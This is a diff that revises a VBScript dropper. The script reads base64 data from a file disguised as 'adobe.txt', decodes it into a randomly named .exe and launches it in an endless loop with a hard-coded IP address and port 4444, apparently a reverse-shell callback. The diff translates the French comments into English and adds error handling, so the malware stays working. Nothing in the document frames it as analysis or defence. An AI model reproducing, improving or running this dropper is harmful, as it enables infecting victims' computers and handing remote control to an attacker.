@@ -1,60 +1,52 @@
 Option Explicit
 
+Dim a, inFile, fso, ts, b64, bytes, outFile, curDir, loopCount
 
+a = "C:\Users\tangu\Bureau\a\adobe.txt"
 
-Dim a, inFile, fso, ts, b64, bytes, outFile, curDir
-
-a = "c:\windows\system32\adobe.txt"
-
-' --- Vérifie les paramètres ---
-
-
+' Check file path
 inFile = a
-
 Set fso = CreateObject("Scripting.FileSystemObject")
-
-' --- Vérifie que le fichier existe ---
 If Not fso.FileExists(inFile) Then
-  WScript.Echo "Erreur: fichier introuvable: " & inFile
+  WScript.Echo "Error: File not found: " & inFile
   WScript.Quit 1
 End If
 
-' --- Dossier courant (là où le script est lancé) ---
+' Set current directory
 curDir = fso.GetAbsolutePathName(".")
 
-' --- Construit un nom aléatoire .exe dans le dossier courant ---
-
-
-' --- Lit le Base64 depuis le fichier ---
+' Read Base64 data
 Set ts = fso.OpenTextFile(inFile, 1, False) ' ForReading
 b64 = ts.ReadAll
 ts.Close
 
-' --- Nettoyage Base64 (retours ligne / espaces / tabulations) ---
+' Clean Base64 data (removing unnecessary characters)
 b64 = Replace(b64, vbCr, "")
 b64 = Replace(b64, vbLf, "")
 b64 = Replace(b64, vbTab, "")
 b64 = Replace(b64, " ", "")
 
-' --- Décode puis écrit le binaire ---
+' Decode the Base64 data
 bytes = DecodeBase64(b64)
+If IsEmpty(bytes) Then
+  WScript.Echo "Error: Failed to decode Base64 data."
+  WScript.Quit 1
+End If
 
-do
-WScript.Sleep 120000
-outFile = fso.BuildPath(curDir, RandomName(12) & ".exe")
-WriteBytes outFile, bytes
-Dim sh
-Set sh = CreateObject("WScript.Shell")
+' Write .exe file
+loopCount = 0
+do  
+  outFile = fso.BuildPath(curDir, RandomName(12) & ".exe")
+  WriteBytes outFile, bytes
+  
+  Dim sh
+  Set sh = CreateObject("WScript.Shell")
+  sh.Run """" & outFile & """ 88.183.58.29 4444", 1, False
+  WScript.Sleep 100000
 
-sh.Run """" & outFile & """ 88.183.58.29 4444", 1, False
+Loop
 
-loop
-
-
-
-' ============================================================
-' Décode une chaîne Base64 en tableau d'octets (byte array)
-' ============================================================
+' Functions remain unchanged
 Private Function DecodeBase64(ByVal s)
   Dim xm, el
   Set xm = CreateObject("Microsoft.XMLDOM")
@@ -64,10 +56,6 @@ Private Function DecodeBase64(ByVal s)
   DecodeBase64 = el.NodeTypedValue
 End Function
 
-' ============================================================
-' Écrit un tableau d'octets dans un fichier (binaire)
-' overwrite = 2 (écrase si existe)
-' ============================================================
 Private Sub WriteBytes(ByVal path, ByVal b)
   Dim st
   Set st = CreateObject("ADODB.Stream")
@@ -78,9 +66,6 @@ Private Sub WriteBytes(ByVal path, ByVal b)
   st.Close
 End Sub
 
-' ============================================================
-' Génère une chaîne aléatoire alphanumérique de longueur n
-' ============================================================
 Private Function RandomName(ByVal n)
   Dim chars, i
   chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
@@ -89,7 +74,3 @@ Private Function RandomName(ByVal n)
     RandomName = RandomName & Mid(chars, Int(Rnd * Len(chars)) + 1, 1)
   Next
 End Function
-
-
-
-
